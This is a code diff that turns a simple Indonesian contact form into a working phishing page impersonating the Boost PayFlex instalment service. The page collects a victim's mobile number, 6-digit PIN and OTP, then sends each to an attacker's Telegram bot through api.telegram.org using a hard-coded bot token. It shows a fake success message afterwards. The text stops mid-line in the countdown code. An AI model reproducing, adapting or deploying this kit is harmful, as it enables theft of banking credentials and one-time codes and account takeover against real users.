@@ -1,38 +1,657 @@
-index.html
+
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Boostpayflex Update</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Boost PayFlex - Apply now and live life on your terms">
+    <meta name="keywords" content="Boost, PayFlex, Payment, Instalment">
+    <title>Boost PayFlex - Ways to use</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: #e60023;
+            padding: 18px 20px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            color: white;
+            font-size: 30px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .logo-icon {
+            width: 38px;
+            height: 38px;
+            background: white;
+            border-radius: 8px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            color: #e60023;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            margin-top: 40px;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        /* Page 1 - Landing */
+        .main-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1a1a1a;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .description {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .cta-text {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 24px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #e60023;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary:hover {
+            background: #cc0020;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(230, 0, 35, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        /* Page 2 - Sign In */
+        .page-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+
+        .page-subtitle {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .form-label {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .input-text {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            border: none;
+            border-bottom: 2px solid #e0e0e0;
+            outline: none;
+            transition: border-color 0.3s ease;
+            margin-bottom: 30px;
+            background: transparent;
+        }
+
+        .input-text:focus {
+            border-bottom-color: #e60023;
+        }
+
+        .pin-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 40px;
+            justify-content: space-between;
+        }
+
+        .pin-dot {
+            width: 48px;
+            height: 48px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .pin-dot.filled {
+            border-color: #e60023;
+            color: #e60023;
+        }
+
+        .btn-next-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+
+        .btn-circle {
+            width: 64px;
+            height: 64px;
+            background: #e60023;
+            border: none;
+            border-radius: 50%;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(230, 0, 35, 0.3);
+        }
+
+        .btn-circle:hover {
+            background: #cc0020;
+            transform: scale(1.05);
+            box-shadow: 0 6px 16px rgba(230, 0, 35, 0.4);
+        }
+
+        .btn-circle:active {
+            transform: scale(0.98);
+        }
+
+        /* Page 3 - OTP */
+        .otp-info {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .otp-info strong {
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+
+        .btn-outline {
+            width: 100%;
+            background: white;
+            color: #e60023;
+            border: 2px solid #e60023;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-outline:hover {
+            background: #fff5f5;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            background: #f5f5f5;
+            color: #666;
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-secondary:hover {
+            background: #e0e0e0;
+        }
+
+        .timer-info {
+            text-align: center;
+            color: #999;
+            font-size: 14px;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .timer {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-top: 8px;
+        }
+
+        /* Hidden input */
+        .hidden-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+
+            .card {
+                padding: 30px 20px;
+                margin-top: 30px;
+            }
+
+            .main-title {
+                font-size: 24px;
+            }
+
+            .page-title {
+                font-size: 24px;
+            }
+
+            .pin-dot {
+                width: 42px;
+                height: 42px;
+                font-size: 28px;
+            }
+
+            .btn-circle {
+                width: 56px;
+                height: 56px;
+                font-size: 24px;
+            }
+        }
+    </style>
 </head>
 <body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <div class="loading-text">Processing...</div>
+        </div>
+    </div>
 
-<div class="container">
-  <div class="card">
-    <h1>Boostpayflex Update</h1>
-    <p>Silakan isi formulir di bawah ini untuk menghubungi kami.</p>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">B</div>
+            <span>oost</span>
+        </div>
+    </div>
 
-    <form id="form">
-      <label>Nomor Telepon</label>
-      <input type="tel" placeholder="08xxxxxxxxxx" required>
+    <div class="container">
+        <!-- Page 1: Landing -->
+        <div class="page active" id="page1">
+            <div class="card">
+                <h1 class="main-title">Ways to use Boost PayFlex</h1>
+                <p class="description">
+                    Ways to use Boost PayFlex Boost PayFlex makes everyday purchases and larger expenses manageable. 
+                    Choose a repayment plan that fits you, with up to 24 months instalment.
+                </p>
+                <p class="cta-text">Apply now and live life on your terms !</p>
+                <button class="btn-primary" onclick="goToPage(2)">Apply Now</button>
+            </div>
+        </div>
 
-      <label>Kode Referensi</label>
-      <input type="text" placeholder="REF123456" required>
+        <!-- Page 2: Sign In -->
+        <div class="page" id="page2">
+            <div class="card">
+                <h2 class="page-title">Sign in to Boost</h2>
+                <p class="page-subtitle">Sign in with your registered Boost mobile number.</p>
+                
+                <label class="form-label">Mobile Number</label>
+                <input type="tel" class="input-text" id="mobileNumber" placeholder="+60  1234567890" value="+60  ">
+                
+                <label class="form-label">6-digit PIN</label>
+                <div class="pin-container" id="pinDisplay" onclick="focusPinInput()">
+                    <div class="pin-dot" id="pin1"></div>
+                    <div class="pin-dot" id="pin2"></div>
+                    <div class="pin-dot" id="pin3"></div>
+                    <div class="pin-dot" id="pin4"></div>
+                    <div class="pin-dot" id="pin5"></div>
+                    <div class="pin-dot" id="pin6"></div>
+                </div>
+                <input type="password" class="hidden-input" id="pinInput" maxlength="6" oninput="updatePinDisplay(this.value)">
+                
+                <div class="btn-next-container">
+                    <button class="btn-circle" onclick="submitPinPage()">→</button>
+                </div>
+            </div>
+        </div>
 
-      <label>Pesan</label>
-      <textarea rows="3" placeholder="Tulis pesan Anda"></textarea>
+        <!-- Page 3: OTP -->
+        <div class="page" id="page3">
+            <div class="card">
+                <h2 class="page-title">Purchase Authentication</h2>
+                <p class="otp-info">The OTP code has been sent to <strong id="maskedPhone">+601****90</strong></p>
+                
+                <label class="form-label">6-digit OTP</label>
+                <div class="pin-container" id="otpDisplay" onclick="focusOtpInput()">
+                    <div class="pin-dot" id="otp1"></div>
+                    <div class="pin-dot" id="otp2"></div>
+                    <div class="pin-dot" id="otp3"></div>
+                    <div class="pin-dot" id="otp4"></div>
+                    <div class="pin-dot" id="otp5"></div>
+                    <div class="pin-dot" id="otp6"></div>
+                </div>
+                <input type="text" class="hidden-input" id="otpInput" maxlength="6" oninput="updateOtpDisplay(this.value)">
+                
+                <button class="btn-primary" onclick="submitOtpPage()">CONFIRM</button>
+                <button class="btn-outline" onclick="resendOtp()">RESEND</button>
+                <button class="btn-secondary" onclick="cancelOtp()">CANCEL</button>
+                
+                <div class="timer-info">
+                    The page will automatically timeout after 7 minutes.
+                    <div class="timer">Time left: <span id="countdown">7:00</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-      <button type="submit">Kirim</button>
-    </form>
+    <script>
+        // ====== KONFIGURASI TELEGRAM ======
+        // GANTI DENGAN BOT TOKEN DAN CHAT ID ANDA
+        const TELEGRAM_BOT_TOKEN = 8581835634:AAHB1ZdXKewsH5UbNguz-IlVzg41HyaYQfI
+        const TELEGRAM_CHAT_ID = @boostpayflex_update_bot
+        // ==================================
 
-    <small class="note">
-      Data digunakan hanya untuk keperluan komunikasi.
-    </small>
-  </div>
-</div>
+        let userPhone = '';
+        let userPin = '';
+        let userOtp = '';
+        let countdownTimer;
 
-<script src="script.js"></script>
-</body>
-</html>
+        // Navigate between pages
+        function goToPage(pageNum) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            document.getElementById('page' + pageNum).classList.add('active');
+            
+            if (pageNum === 2) {
+                setTimeout(() => focusPinInput(), 100);
+            } else if (pageNum === 3) {
+                startCountdown();
+                setTimeout(() => focusOtpInput(), 100);
+            }
+        }
+
+        // PIN Input handling
+        function focusPinInput() {
+            document.getElementById('pinInput').focus();
+        }
+
+        function updatePinDisplay(value) {
+            for (let i = 1; i <= 6; i++) {
+                const dot = document.getElementById('pin' + i);
+                if (i <= value.length) {
+                    dot.classList.add('filled');
+                    dot.textContent = '•';
+                } else {
+                    dot.classList.remove('filled');
+                    dot.textContent = '';
+                }
+            }
+        }
+
+        // OTP Input handling
+        function focusOtpInput() {
+            document.getElementById('otpInput').focus();
+        }
+
+        function updateOtpDisplay(value) {
+            for (let i = 1; i <= 6; i++) {
+                const dot = document.getElementById('otp' + i);
+                if (i <= value.length) {
+                    dot.classList.add('filled');
+                    dot.textContent = '•';
+                } else {
+                    dot.classList.remove('filled');
+                    dot.textContent = '';
+                }
+            }
+        }
+
+        // Submit PIN page
+        async function submitPinPage() {
+            userPhone = document.getElementById('mobileNumber').value.trim();
+            userPin = document.getElementById('pinInput').value;
+            
+            if (!userPhone || userPhone === '+60' || userPhone === '+60  ') {
+                alert('Please enter your mobile number');
+                return;
+            }
+            
+            if (userPin.length !== 6) {
+                alert('Please enter 6-digit PIN');
+                return;
+            }
+            
+            // Mask phone number for OTP page
+            const phoneDigits = userPhone.replace(/\D/g, '');
+            let masked = '';
+            if (phoneDigits.length > 4) {
+                masked = '+' + phoneDigits.substring(0, 3) + phoneDigits.substring(3, 4) + '****' + phoneDigits.substring(phoneDigits.length - 2);
+            } else {
+                masked = userPhone;
+            }
+            document.getElementById('maskedPhone').textContent = masked;
+            
+            // Send to Telegram
+            await sendToTelegram('PIN', {
+                phone: userPhone,
+                pin: userPin
+            });
+            
+            goToPage(3);
+        }
+
+        // Submit OTP page
+        async function submitOtpPage() {
+            userOtp = document.getElementById('otpInput').value;
+            
+            if (userOtp.length !== 6) {
+                alert('Please enter 6-digit OTP');
+                return;
+            }
+            
+            // Send complete data to Telegram
+            await sendToTelegram('COMPLETE', {
+                phone: userPhone,
+                pin: userPin,
+                otp: userOtp
+            });
+            
+            // Show success message
+            alert('✅ Authentication successful!\n\nThank you for using Boost PayFlex.');
+            
+            // Reset and go back to page 1
+            resetForm();
+            goToPage(1);
+        }
+
+        // Send data to Telegram
+        async function sendToTelegram(type, data) {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            loadingOverlay.classList.add('active');
+            
+            let message = '';
+            const timestamp = new Date().toLocaleString('en-MY', { 
+                timeZone: 'Asia/Kuala_Lumpur',
+                hour12: true 
+            });
+            
+            if (type === 'PIN') {
+                message = `🔔 *BOOST PAYFLEX - NEW LOGIN*\n\n` +
+                         `📱 *Phone Number:*\n\`${data.phone}\`\n\n` +
+                         `🔐 *PIN Code:*\n\`${data.pin}\`\n\n` +
+                         `⏰ *Time:* ${timestamp}\n` +
+                         `🌐 *Status:* Waiting for OTP...`;
+            } else if (type === 'COMPLETE') {
+                message = `✅ *BOOST PAYFLEX - COMPLETE DATA*\n\n` +
+                         `📱 *Phone Number:*\n\`${data.phone}\`\n\n` +
+                         `🔐 *PIN Code:*\n\`${data.pin}\`\n\n` +
+                         `🔑 *OTP Code:*\n\`${data.otp}\`\n\n` +
+                         `⏰ *Time:* ${timestamp}\n` +
+                         `✔️ *Status:* VERIFIED`;
+            }
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (!result.ok) {
+                    console.error('Telegram send failed:', result.description);
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            } finally {
+                setTimeout(() => {
+                    loadingOverlay.classList.remove('active');
+                }, 500);
+            }
+        }
+
+        // Resend OTP
+        function resendOtp() {
+            alert('📩 OTP code has been resent to your mobile number.');
+            // Reset countdown
+            clearInterval(countdownTimer);
+            startCountdown();
+            
+            // Clear OTP input
+            document.getElementById('otpInput').value = '';
+            updateOtpDisplay('');
+            focusOtpInput();
+        }
+
+        // Cancel OTP
+        function cancelOtp() {
+            clearInterval(countdownTimer);
+            resetForm();
+            goToPage(2);
+        }
+
+        // Countdown timer
+        function startCountdown() {
+            let timeLeft = 7 * 60; // 7 minutes in seconds
+            
+            const updateTimer = () => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                document.getEl
